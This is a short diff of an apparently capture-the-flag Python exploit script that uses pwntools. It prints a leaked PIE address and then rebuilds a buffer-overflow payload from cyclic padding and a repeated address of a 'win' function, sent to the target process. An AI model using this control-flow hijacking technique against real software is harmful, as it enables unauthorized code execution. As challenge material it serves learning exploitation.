@@ -110,7 +110,7 @@ if __name__ == "__main__":
         print '>>',hex(pie_leak)
 
         print 'going to:',hex(pie_leak+win)
-        payload2 = 'A'*5 + p64(haha) + p64(0xdeadbeef) + p64(0xcaca) + p64(win+pie_leak)*2
+        payload2 = cyclic(5) + p64(haha) + cyclic(16) + p64(win+pie_leak)*13
         p.recvuntil(' Chalcatongo?')
         p.sendline(payload2)
 
